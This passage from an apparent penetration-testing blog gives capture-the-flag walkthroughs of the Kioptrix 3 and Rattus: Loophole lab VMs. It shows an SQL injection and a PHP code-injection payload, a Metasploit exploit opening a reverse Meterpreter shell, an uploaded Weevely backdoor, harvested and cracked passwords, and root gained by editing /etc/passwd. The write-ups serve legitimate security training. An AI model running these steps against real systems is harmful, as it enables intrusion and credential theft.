</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
</span><span class='line'>+ OSVDB-3268: /icons/: Directory indexing found.
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ /phpmyadmin/: phpMyAdmin directory found
</span><span class='line'>+ 6543 requests: 0 error(s) and 16 item(s) reported on remote host
</span><span class='line'>+ End Time:           2015-04-25 20:44:21 (GMT2) (8 seconds)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>


<p>After browsing the web page, we can find several vulnerabilities.</p>

<p>SQL injection:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://kioptrix3.com/gallery/gallery.php?id=1%27</span></code></pre></td></tr></table></div></figure>


<p>Remote Code execution:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>POST /index.php HTTP/1.1
</span><span class='line'>Host: kioptrix3.com
</span><span class='line'>User-Agent: Mozilla
</span><span class='line'>Accept-Language: en-US,en;q=0.5
</span><span class='line'>Accept-Encoding: gzip, deflate
</span><span class='line'>Cookie: PHPSESSID=cd5a425d8b3a044f54c070eb10470ff1
</span><span class='line'>Connection: keep-alive
</span><span class='line'>Cache-Control: max-age=0
</span><span class='line'>Content-Type: application/x-www-form-urlencoded
</span><span class='line'>Content-Length: 30
</span><span class='line'>
</span><span class='line'>page=index');eval(phpinfo());#</span></code></pre></td></tr></table></div></figure>


<p>The second one has a Metasploit module that we can use (for LotusCMS):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf > use exploit/multi/http/lcms_php_exec 
</span><span class='line'>msf exploit(lcms_php_exec) > show options 
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/http/lcms_php_exec):
</span><span class='line'>
</span><span class='line'>   Name     Current Setting  Required  Description
</span><span class='line'>   ----     ---------------  --------  -----------
</span><span class='line'>   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>   RHOST                     yes       The target address
</span><span class='line'>   RPORT    80               yes       The target port
</span><span class='line'>   URI      /lcms/           yes       URI
</span><span class='line'>   VHOST                     no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic LotusCMS 3.0
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(lcms_php_exec) > set RHOST kioptrix3.com
</span><span class='line'>RHOST => kioptrix3.com
</span><span class='line'>msf exploit(lcms_php_exec) > set URI /
</span><span class='line'>URI => /
</span><span class='line'>msf exploit(lcms_php_exec) > exploit 
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on 192.168.80.137:4444 
</span><span class='line'>[*] Using found page param: /index.php?page=index
</span><span class='line'>[*] Sending exploit ...
</span><span class='line'>[*] Sending stage (40499 bytes) to 192.168.80.145
</span><span class='line'>[*] Meterpreter session 1 opened (192.168.80.137:4444 -> 192.168.80.145:54507) at 2015-04-25 20:16:36 +0200</span></code></pre></td></tr></table></div></figure>


<p>We invoke a few commands to obtain the shell and upload weevely.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter > sysinfo
</span><span class='line'>Computer    : Kioptrix3
</span><span class='line'>OS          : Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
</span><span class='line'>Meterpreter : php/php
</span><span class='line'>
</span><span class='line'>meterpreter > shell
</span><span class='line'>Process 4662 created.
</span><span class='line'>id
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>
</span><span class='line'>cat /etc/passwd
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>dhcp:x:101:102::/nonexistent:/bin/false
</span><span class='line'>syslog:x:102:103::/home/syslog:/bin/false
</span><span class='line'>klog:x:103:104::/home/klog:/bin/false
</span><span class='line'>mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false
</span><span class='line'>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash
</span><span class='line'>dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash
</span><span class='line'>
</span><span class='line'>uname -a
</span><span class='line'>Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# weevely generate 1234
</span><span class='line'>[generate.php] Backdoor file 'weevely.php' created with password '1234'
</span><span class='line'>
</span><span class='line'>meterpreter > upload /root/weevely.php /home/www/kioptrix3.com/cache/
</span><span class='line'>[*] uploading  : /root/weevely.php -> /home/www/kioptrix3.com/cache/
</span><span class='line'>[*] uploaded   : /root/weevely.php -> /home/www/kioptrix3.com/cache//weevely.php
</span><span class='line'>
</span><span class='line'>root@kali32:~# weevely http://kioptrix3.com/cache/weevely.php 1234
</span><span class='line'>
</span><span class='line'>www-data@:/home/www/kioptrix3.com $ :audit.userfiles 
</span><span class='line'>+--------------------------------+--------+----------+--+--+
</span><span class='line'>| /home/loneferret/.bash_history | exists | readable |  |  |
</span><span class='line'>| /home/loneferret/.ssh          | exists |          |  |  |
</span><span class='line'>| /home/dreg/.profile            | exists | readable |  |  |
</span><span class='line'>| /home/dreg/.bashrc             | exists | readable |  |  |
</span><span class='line'>| /home/loneferret/.profile      | exists | readable |  |  |
</span><span class='line'>| /home/dreg/.bash_logout        | exists | readable |  |  |
</span><span class='line'>| /home/loneferret/.bash_logout  | exists | readable |  |  |
</span><span class='line'>| /home/loneferret/.bashrc       | exists | readable |  |  |
</span><span class='line'>+--------------------------------+--------+----------+--+--+
</span><span class='line'>
</span><span class='line'>www-data@:/etc/apache2 $ cat /etc/apache2/conf.d/phpmyadmin.conf | grep htpasswd
</span><span class='line'>AuthUserFile /etc/phpmyadmin/htpasswd.setup
</span><span class='line'>                AuthUserFile /etc/phpmyadmin/htpasswd.setup
</span><span class='line'>www-data@:/etc/apache2 $ cat /etc/phpmyadmin/htpasswd.setup
</span><span class='line'>admin:*
</span><span class='line'>
</span><span class='line'>www-data@:/home/www/kioptrix3.com $ cat gallery/gconfig.php
</span><span class='line'>        $GLOBALS["gallarific_mysql_server"] = "localhost";
</span><span class='line'>        $GLOBALS["gallarific_mysql_database"] = "gallery";
</span><span class='line'>        $GLOBALS["gallarific_mysql_username"] = "root";
</span><span class='line'>        $GLOBALS["gallarific_mysql_password"] = "fuckeyou";</span></code></pre></td></tr></table></div></figure>


<p>Now we can log to phpmyadmin (found for example by Nikto) with root / fuckeyou credentials:</p>

<p>We found the several interesting things:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Browse gallarific_users: admin / n0t7t1k4</span></code></pre></td></tr></table></div></figure>


<p>In dev_accounts we have:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dreg 0d3eccfb887aabd50f243b3f155c0f85 
</span><span class='line'>loneferret 5badcaf789d3d1d09794d8f021f40f0e</span></code></pre></td></tr></table></div></figure>


<p>Using John The Ripper password cracker:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# cat pass 
</span><span class='line'>loneferret:5badcaf789d3d1d09794d8f021f40f0e:::::::
</span><span class='line'>dreg:0d3eccfb887aabd50f243b3f155c0f85:::::::
</span><span class='line'>..
</span><span class='line'>root@kali32:~# john pass --format=raw-md5 --show
</span><span class='line'>loneferret:starwars:::::::
</span><span class='line'>dreg:Mast3r:::::::
</span><span class='line'>
</span><span class='line'>2 password hashes cracked, 0 left</span></code></pre></td></tr></table></div></figure>


<p>We log as loneferret user and after listing sudo -l we will see that the HT
Editor could be invoked.</p>

<p>In editor running with the root privileges we change the /etc/passwd entry
according:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dreg:x:0:0:Dreg Gevans,0,555-5566,:/home/dreg:/bin/bash                                                                             │</span></code></pre></td></tr></table></div></figure>


<p>We log in as dreg / Mast3r with root privileges and read the congratulation
file, there is some information about alternative solutions / exploits:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@Kioptrix3:/root# cat Congrats.txt
</span><span class='line'>Good for you for getting here.
</span><span class='line'>Regardless of the matter (staying within the spirit of the game of course)
</span><span class='line'>you got here, congratulations are in order. Wasn't that bad now was it.
</span><span class='line'>
</span><span class='line'>Went in a different direction with this VM. Exploit based challenges are
</span><span class='line'>nice. Helps workout that information gathering part, but sometimes we
</span><span class='line'>need to get our hands dirty in other things as well.
</span><span class='line'>Again, these VMs are beginner and not intented for everyone.
</span><span class='line'>Difficulty is relative, keep that in mind.
</span><span class='line'>
</span><span class='line'>The object is to learn, do some research and have a little (legal)
</span><span class='line'>fun in the process.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>I hope you enjoyed this third challenge.
</span><span class='line'>
</span><span class='line'>Steven McElrea
</span><span class='line'>aka loneferret
</span><span class='line'>http://www.kioptrix.com
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Credit needs to be given to the creators of the gallery webapp and CMS used
</span><span class='line'>for the building of the Kioptrix VM3 site.
</span><span class='line'>
</span><span class='line'>Main page CMS:
</span><span class='line'>http://www.lotuscms.org
</span><span class='line'>
</span><span class='line'>Gallery application:
</span><span class='line'>Gallarific 2.1 - Free Version released October 10, 2009
</span><span class='line'>http://www.gallarific.com
</span><span class='line'>Vulnerable version of this application can be downloaded
</span><span class='line'>from the Exploit-DB website:
</span><span class='line'>http://www.exploit-db.com/exploits/15891/
</span><span class='line'>
</span><span class='line'>The HT Editor can be found here:
</span><span class='line'>http://hte.sourceforge.net/downloads.html
</span><span class='line'>And the vulnerable version on Exploit-DB here:
</span><span class='line'>http://www.exploit-db.com/exploits/17083/
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Also, all pictures were taken from Google Images, so being part of the
</span><span class='line'>public domain I used them.</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Rattus: Loophole]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/16/rattus-loophole/"/>
    <updated>2015-05-16T16:14:09+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/16/rattus-loophole</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/rattus-loophole,27/">Rattus: Loophole</a></p>

<p>Our objective was to find and decrypt the &lsquo;Private.doc.enc&rsquo; file.  When we
boot the image, we can see the network information. With ipcalc we display the
possible hosts:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# ipcalc 10.8.7.0/255.255.255.248
</span><span class='line'>Address:   10.8.7.0             00001010.00001000.00000111.00000 000
</span><span class='line'>Netmask:   255.255.255.248 = 29 11111111.11111111.11111111.11111 000
</span><span class='line'>Wildcard:  0.0.0.7              00000000.00000000.00000000.00000 111
</span><span class='line'>=>
</span><span class='line'>Network:   10.8.7.0/29          00001010.00001000.00000111.00000 000
</span><span class='line'>HostMin:   10.8.7.1             00001010.00001000.00000111.00000 001
</span><span class='line'>HostMax:   10.8.7.6             00001010.00001000.00000111.00000 110
</span><span class='line'>Broadcast: 10.8.7.7             00001010.00001000.00000111.00000 111
</span><span class='line'>Hosts/Net: 6                     Class A, Private Internet</span></code></pre></td></tr></table></div></figure>


<p>We assign the last IP address from network 10.8.7.0/29:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# ifconfig eth0:1 10.8.7.6</span></code></pre></td></tr></table></div></figure>


<p>Nmap output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap -sV 10.8.7.2 -p-
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-25 12:25 CEST
</span><span class='line'>Nmap scan report for 10.8.7.2
</span><span class='line'>Host is up (0.0017s latency).
</span><span class='line'>Not shown: 65530 closed ports
</span><span class='line'>PORT    STATE SERVICE     VERSION
</span><span class='line'>22/tcp  open  ssh         OpenSSH 4.4 (protocol 1.99)
</span><span class='line'>80/tcp  open  http        Apache httpd 1.3.31 ((Unix) PHP/4.4.4)
</span><span class='line'>113/tcp open  ident?
</span><span class='line'>139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
</span><span class='line'>445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
</span><span class='line'>MAC Address: 00:0C:29:53:2F:A3 (VMware)</span></code></pre></td></tr></table></div></figure>


<p>Nikto output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nikto -h 10.8.7.2
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          10.8.7.2
</span><span class='line'>+ Target Hostname:    10.8.7.2
</span><span class='line'>+ Target Port:        80
</span><span class='line'>+ Start Time:         2015-05-08 18:41:31 (GMT2)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache/1.3.31 (Unix) PHP/4.4.4
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, inode: 20924, size: 3001, mtime: Fri Feb 18 12:33:59 2011
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ OSVDB-637: Enumeration of users is possible by requesting ~username (responds with 'Forbidden' for users, 'not found' for non-existent users).
</span><span class='line'>+ Uncommon header 'tcn' found, with contents: list
</span><span class='line'>+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
</span><span class='line'>+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header
</span><span class='line'>+ PHP/4.4.4 appears to be outdated (current is at least 5.4.26)
</span><span class='line'>+ Apache/1.3.31 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE, POST, PUT, DELETE, CONNECT, PATCH, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK
</span><span class='line'>+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
</span><span class='line'>+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
</span><span class='line'>+ HTTP method ('Allow' Header): 'CONNECT' may allow server to proxy client requests.
</span><span class='line'>+ HTTP method: 'PATCH' may allow client to issue patch commands to server. See RFC-5789.
</span><span class='line'>+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
</span><span class='line'>+ WebDAV enabled (UNLOCK LOCK MKCOL COPY PROPPATCH PROPFIND listed as allowed)
</span><span class='line'>+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
</span><span class='line'>+ Retrieved x-powered-by header: PHP/4.4.4
</span><span class='line'>+ OSVDB-3092: /info/: This might be interesting...
</span><span class='line'>+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
</span><span class='line'>+ OSVDB-3268: /icons/: Directory indexing found.
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
</span><span class='line'>+ 7355 requests: 0 error(s) and 22 item(s) reported on remote host
</span><span class='line'>+ End Time:           2015-05-08 18:41:43 (GMT2) (12 seconds)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>


<p>Dirb output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>==> DIRECTORY: http://10.8.7.2/Images/
</span><span class='line'>+ http://10.8.7.2/cgi-bin/ (CODE:403|SIZE:274)
</span><span class='line'>+ http://10.8.7.2/garbage (CODE:200|SIZE:288)
</span><span class='line'>+ http://10.8.7.2/index (CODE:200|SIZE:3001)
</span><span class='line'>+ http://10.8.7.2/index.html (CODE:200|SIZE:3001)
</span><span class='line'>+ http://10.8.7.2/info (CODE:200|SIZE:37715)
</span><span class='line'>+ http://10.8.7.2/info.php (CODE:200|SIZE:37485)
</span><span class='line'>+ http://10.8.7.2/status (CODE:200|SIZE:2456)
</span><span class='line'>+ http://10.8.7.2/~operator (CODE:403|SIZE:275)
</span><span class='line'>+ http://10.8.7.2/~root (CODE:403|SIZE:271)</span></code></pre></td></tr></table></div></figure>


<p>The most interesting file was <a href="http://10.8.7.2/garbage">http://10.8.7.2/garbage</a> with these hashes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root:$1$x2YBL0KB$E7QI7AF9ZeiqcfMRQ4KZ11:15018:0:::::
</span><span class='line'>smmsp:!!:9797:0:::::
</span><span class='line'>mysql:!!:9797:0:::::
</span><span class='line'>rpc:!!:9797:0:::::
</span><span class='line'>sshd:!!:9797:0:::::
</span><span class='line'>apache:!!:9797:0:::::
</span><span class='line'>nobody:!!:9797:0:::::
</span><span class='line'>mhog:$1$ZQAbXwf3$TgcNjljKW.2tlJw4OICDr1:15019:0:::::0
</span><span class='line'>tskies:$1$ZvNtdn0x$ck5hnAwXg.OLQPOtg28Hb.:15019:0:::::0</span></code></pre></td></tr></table></div></figure>


<p>We were able to crack each one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# john garbage.hash --show
</span><span class='line'>root:albatros:15018:0:::::
</span><span class='line'>mhog:mhog:15019:0:::::0
</span><span class='line'>tskies:nostradamus:15019:0:::::0
</span><span class='line'>
</span><span class='line'>3 password hashes cracked, 0 left</span></code></pre></td></tr></table></div></figure>


<p>Now we can log in as root via ssh, but because this was too easy, we decided to
explore samba service too.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# smbclient -L\\ -I 10.8.7.2
</span><span class='line'>Enter root's password:
</span><span class='line'>Anonymous login successful
</span><span class='line'>Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.23c]
</span><span class='line'>
</span><span class='line'>        Sharename       Type      Comment
</span><span class='line'>        ---------       ----      -------
</span><span class='line'>        homes           Disk      Home directories
